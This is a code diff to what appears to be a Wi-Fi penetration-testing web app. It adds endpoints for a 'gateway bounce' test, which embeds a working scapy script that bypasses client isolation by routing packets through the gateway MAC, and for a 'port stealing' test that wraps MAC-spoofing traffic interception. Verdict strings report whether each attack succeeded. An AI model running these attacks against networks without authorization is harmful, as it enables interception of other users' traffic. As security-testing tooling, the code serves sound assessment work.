@@ -81,6 +81,14 @@ _hs_proc: subprocess.Popen | None = None
 _hs_pcap_prefix: str = "/tmp/airsnitch_hs"
 _hs_hccapx: str = "/tmp/airsnitch_hs.hccapx"
 
+# Gateway bounce test state (fire-and-poll)
+_gwbounce_job: dict = {"status": "idle"}
+_gwbounce_task: asyncio.Task | None = None
+
+# Port steal test state (fire-and-poll)
+_portsteal_job: dict = {"status": "idle"}
+_portsteal_task: asyncio.Task | None = None
+
 # ── Helpers ──────────────────────────────────────────────────────────────────
 
 def get_wpa_supplicant_cmd(mode: str) -> tuple[str, bool]:
@@ -2068,6 +2076,257 @@ async def api_mitm_stop(request):
     })
 
 
+# ── Gateway Bouncing ──────────────────────────────────────────────────────────
+#
+# Tests whether the network enforces client isolation only at L2 (Ethernet).
+# If so, an attacker can send Ether(dst=gw_mac)/IP(dst=victim) — the gateway
+# will route the packet to the victim at L3, bypassing isolation entirely.
+# ─────────────────────────────────────────────────────────────────────────────
+
+_GWBOUNCE_SCRIPT = r'''
+import sys
+from scapy.all import Ether, ARP, IP, ICMP, srp, srp1, get_if_addr
+import subprocess
+
+iface  = sys.argv[1]
+gw_ip  = sys.argv[2]
+victim = sys.argv[3]
+
+print(f"[*] Gateway Bounce Test on {iface}: {gw_ip} -> {victim}")
+
+# Step 1: Resolve gateway MAC via ARP
+print(f"[*] Resolving gateway MAC for {gw_ip}...")
+gw_mac = None
+try:
+    ans = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=gw_ip),
+              iface=iface, timeout=3, verbose=0, retry=1)[0]
+    for _, r in ans:
+        gw_mac = r[Ether].src
+        break
+except Exception as e:
+    print(f"    ARP probe failed: {e}")
+
+if not gw_mac:
+    try:
+        out = subprocess.check_output(["ip", "neigh", "show", gw_ip], text=True)
+        for tok in out.split():
+            if len(tok) == 17 and tok.count(":") == 5:
+                gw_mac = tok
+                break
+    except Exception:
+        pass
+
+if not gw_mac:
+    print(f"RESULT:ERROR: Could not resolve MAC address for gateway {gw_ip}")
+    raise SystemExit(1)
+
+print(f"[+] Gateway MAC: {gw_mac}")
+
+# Step 2: Get our IP on this interface
+our_ip = get_if_addr(iface)
+if not our_ip or our_ip == "0.0.0.0":
+    print(f"RESULT:ERROR: No IP on interface {iface} — connect to the network first")
+    raise SystemExit(1)
+
+print(f"[+] Our IP: {our_ip}")
+print(f"[*] Packet: Ether(dst={gw_mac}) / IP(src={our_ip}, dst={victim}) / ICMP(echo-request)")
+print(f"[*] Sending 5 attempts, 4s timeout each...")
+
+# Step 3: Send the bounced packet and listen for ICMP echo reply
+replied = False
+for attempt in range(5):
+    pkt = (Ether(dst=gw_mac) /
+           IP(src=our_ip, dst=victim) /
+           ICMP(type=8, id=0xAC17, seq=attempt + 1) /
+           b"AirSnitch-GwBounce")
+    ans = srp1(pkt, iface=iface, timeout=4, verbose=0,
+               filter=f"src host {victim}")
+    if ans is not None and ICMP in ans and ans[ICMP].type == 0:
+        print(f"[+] ICMP echo reply from {victim} — gateway routed our packet at L3!")
+        replied = True
+        break
+    print(f"[-] Attempt {attempt + 1}/5 — no reply from {victim}")
+
+if replied:
+    print("RESULT:VULNERABLE: Gateway bounced our packet to the victim. "
+          "Client isolation is L2-only; routing via the gateway bypasses it.")
+else:
+    print("RESULT:NOT_VULNERABLE: No ICMP reply received. "
+          "Gateway bouncing did not succeed — isolation is enforced at L3, "
+          "or the victim IP is not responding to ICMP.")
+'''
+
+
+async def api_gwbounce_start(request):
+    """Start a gateway bounce test in the background (fire-and-poll)."""
+    global _gwbounce_job, _gwbounce_task
+
+    body = await request.json()
+    iface  = body.get("iface", "").strip()
+    gw_ip  = body.get("gateway", "").strip()
+    victim = body.get("victim", "").strip()
+
+    if not iface or not re.match(r'^[a-zA-Z0-9_-]+$', iface):
+        return web.json_response({"error": "Invalid interface"}, status=400)
+    if not re.match(r'^\d{1,3}(\.\d{1,3}){3}$', gw_ip):
+        return web.json_response({"error": "Invalid gateway IP"}, status=400)
+    if not re.match(r'^\d{1,3}(\.\d{1,3}){3}$', victim):
+        return web.json_response({"error": "Invalid victim IP"}, status=400)
+
+    if _gwbounce_task is not None and not _gwbounce_task.done():
+        return web.json_response({"status": "running"})
+
+    script_path = "/tmp/airsnitch_gwbounce.py"
+    with open(script_path, "w") as f:
+        f.write(_GWBOUNCE_SCRIPT)
+
+    _gwbounce_job = {"status": "running", "output": ""}
+
+    async def _run():
+        global _gwbounce_job
+        cmd = (f"bash -c 'cd {AIRSNITCH_DIR} && source venv/bin/activate && "
+               f"python3 {script_path} {iface} {gw_ip} {victim}'")
+        append_log(f"[gwbounce] {cmd}")
+        rc, out = await async_run(cmd, timeout=90)
+        append_log(f"[gwbounce] rc={rc}")
+        if out:
+            append_log(out[:600])
+
+        verdict = "INCONCLUSIVE"
+        detail = ""
+        for line in out.splitlines():
+            if line.startswith("RESULT:VULNERABLE"):
+                verdict = "VULNERABLE"
+                detail = line[len("RESULT:VULNERABLE:"):].strip()
+                break
+            elif line.startswith("RESULT:NOT_VULNERABLE"):
+                verdict = "NOT_VULNERABLE"
+                detail = line[len("RESULT:NOT_VULNERABLE:"):].strip()
+                break
+            elif line.startswith("RESULT:ERROR"):
+                verdict = "ERROR"
+                detail = line[len("RESULT:ERROR:"):].strip()
+                break
+
+        _gwbounce_job = {
+            "status": "done",
+            "verdict": verdict,
+            "verdict_detail": detail,
+            "output": out,
+        }
+
+    _gwbounce_task = asyncio.create_task(_run())
+    return web.json_response({"status": "started"})
+
+
+async def api_gwbounce_poll(request):
+    """Return current gateway bounce job state."""
+    return web.json_response(_gwbounce_job)
+
+
+async def api_gwbounce_stop(request):
+    """Cancel a running gateway bounce test."""
+    global _gwbounce_job, _gwbounce_task
+    if _gwbounce_task and not _gwbounce_task.done():
+        _gwbounce_task.cancel()
+        try:
+            await asyncio.wait_for(asyncio.shield(_gwbounce_task), timeout=3)
+        except (asyncio.CancelledError, asyncio.TimeoutError):
+            pass
+    _gwbounce_job = {"status": "idle"}
+    run("pkill -f airsnitch_gwbounce 2>/dev/null", timeout=3)
+    return web.json_response({"status": "stopped"})
+
+
+# ── Port Stealing ─────────────────────────────────────────────────────────────
+#
+# Uses the upstream airsnitch.py --c2c-port-steal / --c2c-port-steal-uplink.
+# Requires two wireless interfaces and both victim/attacker network credentials
+# in client.conf (id_str="victim" + id_str="attacker" network blocks).
+#
+# Downlink: attacker connects to different BSSID spoofing victim's MAC →
+#           network routes victim's downlink traffic to attacker.
+# Uplink:   attacker spoofs gateway MAC → victim's uplink goes to attacker.
+# ─────────────────────────────────────────────────────────────────────────────
+
+
+async def api_portsteal_start(request):
+    """Start a port stealing test in the background (fire-and-poll)."""
+    global _portsteal_job, _portsteal_task
+
+    body = await request.json()
+    iface1 = body.get("iface1", "").strip()
+    iface2 = body.get("iface2", "").strip()
+    mode   = body.get("mode", "downlink").strip()
+
+    if not iface1 or not re.match(r'^[a-zA-Z0-9_-]+$', iface1):
+        return web.json_response({"error": "Invalid primary interface"}, status=400)
+    if not iface2 or not re.match(r'^[a-zA-Z0-9_-]+$', iface2):
+        return web.json_response({"error": "Invalid secondary interface"}, status=400)
+    if mode not in ("downlink", "uplink"):
+        return web.json_response({"error": "mode must be 'downlink' or 'uplink'"}, status=400)
+
+    if _portsteal_task is not None and not _portsteal_task.done():
+        return web.json_response({"status": "running"})
+
+    flag = "--c2c-port-steal" if mode == "downlink" else "--c2c-port-steal-uplink"
+    cmd = (f"bash -c 'cd {AIRSNITCH_DIR} && source venv/bin/activate && "
+           f"python3 airsnitch.py {iface1} {flag} {iface2} --config {CONFIG_PATH}'")
+
+    _portsteal_job = {"status": "running", "mode": mode, "output": ""}
+
+    async def _run():
+        global _portsteal_job
+        append_log(f"[port-steal] {cmd}")
+        rc, out = await async_run(cmd, timeout=300)
+        append_log(f"[port-steal] rc={rc}")
+        if out:
+            append_log(out[:800])
+
+        verdict = "INCONCLUSIVE"
+        detail = ""
+        out_lower = out.lower()
+        if "port stealing is successful" in out_lower or "stealing is successful" in out_lower:
+            verdict = "VULNERABLE"
+            detail = f"{mode.capitalize()} port stealing succeeded — attacker intercepted victim traffic across BSSIDs"
+        elif "not vulnerable" in out_lower:
+            verdict = "NOT_VULNERABLE"
+            detail = "Port stealing did not succeed on this network"
+        elif rc != 0 and verdict == "INCONCLUSIVE":
+            verdict = "ERROR"
+            detail = f"airsnitch.py exited with code {rc}"
+
+        _portsteal_job = {
+            "status": "done",
+            "verdict": verdict,
+            "verdict_detail": detail,
+            "output": out,
+            "mode": mode,
+        }
+
+    _portsteal_task = asyncio.create_task(_run())
+    return web.json_response({"status": "started"})
+
+
+async def api_portsteal_poll(request):
+    """Return current port steal job state."""
+    return web.json_response(_portsteal_job)
+
+
+async def api_portsteal_stop(request):
+    """Cancel a running port steal test."""
+    global _portsteal_job, _portsteal_task
+    if _portsteal_task and not _portsteal_task.done():
+        _portsteal_task.cancel()
+        try:
+            await asyncio.wait_for(asyncio.shield(_portsteal_task), timeout=3)
+        except (asyncio.CancelledError, asyncio.TimeoutError):
+            pass
+    _portsteal_job = {"status": "idle"}
+    run("pkill -f 'airsnitch.py.*c2c-port-steal' 2>/dev/null", timeout=3)
+    return web.json_response({"status": "stopped"})
+
+
 # ── HTTP Content Injection ────────────────────────────────────────────────────
 #
 # When in MITM position, intercepts all port-80 HTTP requests from victims and
@@ -3076,6 +3335,16 @@ def create_app():
     app.router.add_post("/api/pentest/arp-poison-broadcast", api_arp_poison_broadcast)
     app.router.add_post("/api/pentest/mitm-verify", api_mitm_verify)
     app.router.add_post("/api/pentest/mitm-stop", api_mitm_stop)
+
+    # Gateway Bouncing
+    app.router.add_post("/api/attack/gwbounce-start", api_gwbounce_start)
+    app.router.add_get("/api/attack/gwbounce-poll",   api_gwbounce_poll)
+    app.router.add_post("/api/attack/gwbounce-stop",  api_gwbounce_stop)
+
+    # Port Stealing
+    app.router.add_post("/api/attack/portsteal-start", api_portsteal_start)
+    app.router.add_get("/api/attack/portsteal-poll",   api_portsteal_poll)
+    app.router.add_post("/api/attack/portsteal-stop",  api_portsteal_stop)
 
     # AirSnitch (dual NIC)
     app.router.add_post("/api/airsnitch/run", api_airsnitch_run)
